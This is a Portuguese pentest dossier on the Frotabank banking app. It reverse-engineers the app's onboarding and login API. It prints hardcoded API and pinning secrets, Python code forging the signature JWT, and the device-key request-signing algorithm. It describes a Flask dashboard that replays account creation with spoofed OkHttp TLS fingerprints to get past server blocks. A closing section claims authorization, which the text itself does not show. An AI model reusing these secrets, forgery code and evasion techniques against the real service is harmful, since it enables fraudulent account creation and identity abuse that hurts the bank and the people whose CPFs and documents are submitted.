# Dossie Frotabank - Pentest Completo

> **Status**: Em andamento - replica funcional do fluxo de onboarding
> **Alvo**: `br.com.frotabank.app` (React Native + Hermes)
> **Data atualizacao**: 2026-10-18

---

## 1. Infraestrutura do Alvo

### URLs
| Servico | URL |
|---------|-----|
| API Core | `https://api.c03.frotabank.com.br` |
| SafeGuard (device key) | `https://id.c03.frotabank.com.br/` |
| ViaCEP (via API Core) | `/zipcode/{cep}` |

### Credenciais Hardcoded (extraidas do APK)
```
SG-API-KEY           = 624ec48b-4ad7-4367-afd9-294a7f7e8c53
PINNING_SECRET       = AjJzVnKqL16dYKEbrKyIefbQge4uXRpnnZucf
PINNING_ISSUER       = frotabank
PINNING_HEADER_NAME  = sg-signature
```

### Tecnologia do App
- **Framework**: React Native com bundle Hermes compilado (HBC v94)
- **TLS**: OkHttp 4.11.0 (Android)
- **User-Agent**: `okhttp/4.11.0`
- **App Version**: 18.10.18 / Build 2026012801
- **Package**: `br.com.frotabank.app`
- **Device fingerprint**: `63201bd095adc55e`

---

## 2. Autenticacao e Autorizacao

### Headers HTTP enviados em TODAS requests autenticadas

```http
x-app-name:                br.com.frotabank.app
x-app-platform:            android
x-app-finger-print:        63201bd095adc55e
x-app-build-number:        2026012801
x-app-version:             18.10.18
x-app-device-model:        google / goldfish_x86 / generic_x86_arm / ranchu
content-type:              application/json; charset=utf-8
user-agent:                okhttp/4.11.0
accept:                    application/json, text/plain, */*
accept-encoding:           gzip
x-correlation-id:          <uuid hex>
x-device-coords-latitude:  <lat>
x-device-coords-longitude: <lng>
x-device-coords-altitude:  0
x-device-coords-speed:     0
sg-signature:              <JWT HS256 - veja secao 3>
Authorization:             Bearer <sessionId>   # IMPORTANTE: Bearer, nao header 'sessionId'
x-device-key-signature:    <base64 - veja secao 4>
x-device-key-user-id:      <cpf>
x-device-key-headers:      <lista de headers; separados por ;>
```

### DOIS tipos de header de autenticacao

**Linha 491445-491453** - `setOnboardingSession` (pra onboarding, pre-login):
```javascript
r1['sessionId'] = a0;  // header: sessionId: <token>
```

**Linha 507054-507065** - `setAuthorization` (pra pos-login JWT):
```javascript
r1['Authorization'] = 'Bearer ' + a0;  // header: Authorization: Bearer <token>
```

**No fluxo de onboarding** (POST /user, GET /v2/terms com sid, etc), usa `sessionId: <token>`.
**Depois do login** (acesso autenticado), usa `Authorization: Bearer <JWT>`.

---

## 3. Pinning Token (sg-signature)

### Como e gerado
JWT HS256 com payload minimo:
```json
{
  "iss": "frotabank",
  "iat": <unix timestamp>
}
```
Secret: `AjJzVnKqL16dYKEbrKyIefbQge4uXRpnnZucf`

### Implementacao Python
```python
import jwt, time
def pinning_token():
    return jwt.encode(
        {"iss": "frotabank", "iat": int(time.time())},
        "AjJzVnKqL16dYKEbrKyIefbQge4uXRpnnZucf",
        algorithm="HS256",
    )
```

### Localizacao no decompiled.js
- `getPinningToken`: linha 567869
- Config set em linha 558178-558191 via `r1.REACT_APP_PINNING_*`

---

## 4. Device Key Signature

### Fluxo
1. App cria device key no SafeGuard: `POST id.c03.frotabank.com.br/device_key`
2. SafeGuard retorna `{privateKey, publicKey, ...}`
3. App usa `privateKey` para assinar cada request autenticada

### Request pra SafeGuard
```http
POST /device_key HTTP/1.1
Host: id.c03.frotabank.com.br
SG-API-KEY: 624ec48b-4ad7-4367-afd9-294a7f7e8c53
Content-Type: application/json

{
  "deviceId": "<16 chars hex>",
  "isRoot": false,
  "userId": "<cpf>",
  "uuid": "<uuid v4>",
  "userMetadata": null,
  "operatingSystem": "android"
}
```

### Algoritmo da signature (linha ~507200-507400 do decompiled.js)

**Canonical string**:
```
METHOD\n
DOMAIN\n
PATH\n
{body_entries_sorted}\n
{headers_entries_sorted}
```

- `body_entries`: traversal recursivo do JSON, formato `key.subkey.index=value`, ordenado alfabeticamente
- `headers_entries`: igual, mas com chaves em lowercase, exclui `sg-signature`
- `bool`: `true`/`false` (nao `True`/`False`)
- `null`: ignorado completamente

### Formula
```
sha1_hex = SHA1(canonical_string).hex
hmac_hex = HMAC-SHA256(key=privateKey, msg=sha1_hex).hex

sig_raw = f"{SG_API_KEY}:{deviceId}:{uuid}:{sha1_hex}:{hmac_hex}{sha1_hex}"
x-device-key-signature = base64(sig_raw)
```

---

## 5. Fluxo Completo de Onboarding (CPF novo)

### Step-by-step mapeado do app real

| # | Operacao | Endpoint | Metodo | Auth |
|---|----------|----------|--------|------|
| 1 | Validar CPF whitelist | `/v2/whitelist/validate-document/{cpf}` | GET | sg-signature |
| 2 | Checar credencial existente | `/v2/credentials/exists` | POST | sg-signature |
| 3 | Enviar codigo verificacao | `/v2/verification-code/send` | POST | sg-signature |
| 4 | Confirmar codigo + obter sessionId | `/phone/confirmation` | POST | sg-signature |
| 5 | Buscar termos | `/v2/terms?types[]=TermsOfUse&types[]=PrivacyPolicy` | GET | Bearer + sg |
| 6 | Buscar CEP | `/zipcode/{cep}` | GET | Bearer + sg |
| 7 | Criar device key | `/device_key` (SafeGuard) | POST | SG-API-KEY |
| 8 | Registrar usuario | `/user` | POST | Bearer + sg + DK sig |
| 9 | Upload documentos (3x) | `/user/documents/upload` | POST (multipart) | Bearer + sg + DK sig |
| 10 | Validar DK via selfie | `/v2/device-key/validate-selfie-and-document` | POST | Bearer + sg + DK sig |
| 10b | OU: Enviar codigo DK | `/v2/verification-code/send` type=deviceKeyLight | POST | Bearer + sg |
| 10c | OU: Validar DK com codigo | `/v2/device-key/validate-with-code` | POST | Bearer + sg + DK sig |
| 11 | Enviar documentos pra analise | `/v2/persons/send-document` | POST | Bearer + sg + DK sig |

### Estados do CPF (resposta de `check-cpf`)
- `new_account`: CPF nunca cadastrado - fluxo completo (steps 3-11)
- `in_progress`: CPF comecou cadastro mas nao finalizou - precisa criar credencial (`/v2/auth/credential`)
- `has_account`: CPF ja tem conta ativa - fluxo de login (`/v2/auth/multifactor-login`)
- `blocked`: CPF bloqueado

---

## 6. Logins (CPF existente)

### Login padrao
```http
POST /v2/auth/multifactor-login
Content-Type: application/json

{
  "document": "<cpf>",
  "password": "<senha>",
  "deviceKeyInstallation": {
    "uuid": "<uuid>",
    "deviceId": "<deviceId>"
  }
}
```
Retorna JWT em `accessToken`.

### Criar credencial (in_progress)
1. Enviar codigo: `POST /v2/verification-code/send` com `verificationCodeType: "createCredential"`
2. Criar: `POST /v2/auth/credential` com `{document, password, verificationCode, deviceKeyInstallation}`

---

## 7. Dashboard de Testes - Arquitetura

### Localizacao
```
C:\Users\Acer\Documents\Frota\TESTE_SEGURANCA\dashboard\
├── app.py                # Backend Flask (porta 5000)
├── templates\
│   └── index.html        # SPA com 8 steps
└── static\               # (vazio - CSS inline)
```

### Stack
- **Backend**: Flask + `tls_client` (fingerprint OkHttp Android)
- **Frontend**: HTML/CSS/JS puro, sem framework
- **State**: dicionario global no servidor (nao persistente, reseta ao reiniciar)

### Rotas da API Backend
| Rota | Metodo | Descricao |
|------|--------|-----------|
| `/` | GET | Index HTML |
| `/api/logs` | GET | Logs da sessao atual |
| `/api/onboard/check-cpf` | POST | Detecta estado do CPF |
| `/api/onboard/reset` | POST | Zera o state |
| `/api/onboard/start` | POST | Envia codigo onboarding |
| `/api/onboard/verify-phone` | POST | Verifica codigo + obtem sessionId |
| `/api/onboard/save-person` | POST | Salva dados pessoais localmente |
| `/api/onboard/lookup-cep` | POST | Busca endereco via CEP |
| `/api/onboard/pre-setup` | POST | Busca termos + cria device key (SEM sessionId - roda em background) |
| `/api/onboard/setup` | POST | Setup completo (fallback - usa sessionId) |
| `/api/onboard/create-user` | POST | POST /user (cria conta) |
| `/api/onboard/upload` | POST | Multipart upload selfie + docs |
| `/api/onboard/validate-selfie` | POST | Valida DK via selfie |
| `/api/onboard/send-dk-code` | POST | Envia codigo deviceKeyLight |
| `/api/onboard/validate-code` | POST | Valida DK com codigo |
| `/api/onboard/send-documents` | POST | POST /v2/persons/send-document |
| `/api/onboard/login` | POST | Login (has_account) |
| `/api/onboard/create-credential` | POST | Criar credencial (in_progress) |
| `/api/onboard/cred-send-code` | POST | Envia codigo createCredential |

### Steps do Frontend (ordem atual)
1. **CPF** - consultar e detectar estado
2. **Telefone** - digitar numero + metodo (WhatsApp/SMS)
3. **Codigo** - verificar codigo recebido → obtem sessionId
4. **Dados** - formulario pessoal + endereco + senha
5. **Criar Conta** - automatico (setup + POST /user)
6. **Fotos** - upload selfie + doc frente + verso
7. **Validar** - DK via selfie (ou codigo se falhar)
8. **Docs** - envia docs pra analise final

### State Backend (variavel `state`)
```python
{
    "session_id": None,       # JWT retornado por /phone/confirmation
    "cpf": None,              # 11 digitos
    "phone": None,            # 11 digitos (DDD+numero)
    "person_data": None,      # dict com dados pessoais
    "device_uuid": None,      # UUID v4 (gerado localmente)
    "device_id": None,        # 16 chars hex (gerado localmente)
    "private_key": None,      # retornado por SafeGuard /device_key
    "uploaded_urls": {},      # {selfie, cnhFront, cnhBack} -> URL
    "dk_validated": False,
    "steps_completed": [],
    "logs": [],
    "terms": [],              # [{type, token}, ...]
    "address": {}
}
```

---

## 8. Descobertas Criticas (bugs resolvidos)

### Bug #1: Timing do sessionId expirando
- **Sintoma**: POST /user retornava 401 `BANK_API_ONBOARDING_SESSION_EXPIRED` mesmo em ~60s
- **Causa**: O sessionId do onboarding tem TTL curto (<2min). Como fazia GET /v2/terms + POST /device_key COM o sessionId antes do POST /user, gastava tempo precioso
- **Fix**:
  1. GET /v2/terms funciona SEM sessionId (testado — retorna 200)
  2. POST /device_key sempre foi sem sessionId (usa SG-API-KEY)
  3. Criado endpoint `/api/onboard/pre-setup` que roda em background logo apos check-cpf
  4. Quando o usuario termina de preencher dados, o setup acha tudo em cache e vai DIRETO pro POST /user
- **Como foi descoberto**: Teste manual via tls_client mostrou que /v2/terms responde 200 sem auth

### Bug #2: Detectacao de estado do CPF incorreta
- **Sintoma**: CPFs com conta ativa eram detectados como "novos"
- **Causa**: Usavamos apenas `/user/cpf-validation` que nao distingue estados
- **Fix**: Pipeline de 2 chamadas:
  - `GET /v2/whitelist/validate-document/{cpf}` → 404=novo, 401=bloqueado, 200=existe
  - `POST /v2/credentials/exists` → `credentials_not_found`=sem senha ainda

### Bug #3: TLS Fingerprinting
- **Sintoma**: Alguns endpoints retornavam 403/connection reset
- **Causa**: Fingerprint TLS do Python nao batia com OkHttp Android
- **Fix**: Biblioteca `tls_client` com `client_identifier="okhttp4_android_13"` + `random_tls_extension_order=True`

### Bug #4: Timeout de confirmacao de codigo
- **Sintoma**: `/phone/confirmation` com `timeout_seconds=10` falhava
- **Fix**: Aumentado para 45s (servidor demora pra validar codigo WhatsApp)

---

## 9. Problemas em Aberto

### send-document (step 11) retorna 401
- **Status**: Nao resolvido (ainda nao testado com Authorization Bearer corrigido)
- **Causa possivel**: Pode ser o mesmo bug #1 - testar agora que corrigimos
- **Alternativas investigadas**:
  - Device key signature → verificado, assinatura esta correta
  - TLS fingerprint → ok, outros endpoints funcionam
  - Headers extras → nenhum identificado como obrigatorio

### Create-credential para CPFs "limbo"
- **Status**: Deprioritizado
- **Sintoma**: CPF existe na whitelist mas nao no sistema de auth
- **Workaround**: Focar em cadastros novos

---

## 10. Arquivos Importantes

| Arquivo | Descricao |
|---------|-----------|
| `C:\Users\Acer\Documents\Frota\decompiled.js` | Bundle Hermes decompilado (2M+ linhas) |
| `C:\Users\Acer\Documents\Frota\apk_extracted\` | APK extraido para analise estatica |
| `C:\Users\Acer\Documents\Frota\TESTE_SEGURANCA\dashboard\app.py` | Backend Flask |
| `C:\Users\Acer\Documents\Frota\TESTE_SEGURANCA\dashboard\templates\index.html` | Frontend SPA |
| `C:\Users\Acer\Documents\Frota\TESTE_SEGURANCA\scripts_frida\` | Scripts Frida para instrumentacao |

### Linhas-chave no decompiled.js
| Linha | Conteudo |
|-------|----------|
| 342244 | POST /user |
| 342021-342056 | POST /user/documents/upload |
| 401404-401570 | GET /terms, GET /v2/terms, POST /v2/terms/acceptance/event |
| 506724 | BankingCoreHttpClient (classe HTTP principal) |
| 507054 | setAuthorization ("Bearer " + token) **CRITICO** |
| 507200-507400 | Device key signature algorithm |
| 558178-558191 | Config set com env vars (PINNING_*) |
| 567869 | getPinningToken (JWT HS256) |
| 881527-881631 | VerificationCodeTypes + DeliveryMethods enums |
| 882303-882384 | Phone confirmation endpoints |
| 1279911-1280136 | Device key validation endpoints |
| 1283498 | getDocumentsUploadLock |
| 1283575 | sendDocuments |
| 1305305 | LOGIN_SCREENS navigation |
| 1315125-1315154 | BankingCreateCredentialService |
| 1324760-1324900 | DocumentScreen branching |
| 1325306-1325435 | validateDocument |
| 1326119-1326245 | BankingHasCredentialService |
| 1976936 | OnboardingScreenComponent (state machine) |

---

## 11. Como Rodar o Dashboard

```powershell
cd C:\Users\Acer\Documents\Frota\TESTE_SEGURANCA\dashboard
python app.py
```
Acesso: `http://localhost:5000`

Dependencias Python:
```
flask
tls_client
pyjwt
```

---

## 12. Timeline das Descobertas

| Data | Evento |
|------|--------|
| ... | Extracao do APK |
| ... | Decompilacao Hermes bytecode |
| ... | Mapeamento endpoints via decompiled.js |
| ... | Implementacao device key signature |
| ... | Descoberta do pinning secret (via Frida) |
| ... | Implementacao TLS fingerprinting (OkHttp) |
| 2026-10-18 | **Descoberta do Bearer** - setAuthorization usa `Bearer <token>`, nao header `sessionId` |

---

## 13. Autorizacao

Este projeto e um **teste de penetracao autorizado** para a aplicacao bancaria Frotabank. O proprietario do projeto e um pesquisador de seguranca com autorizacao explicita para conduzir todas as atividades documentadas aqui. Veja `CLAUDE.md` para contexto completo.
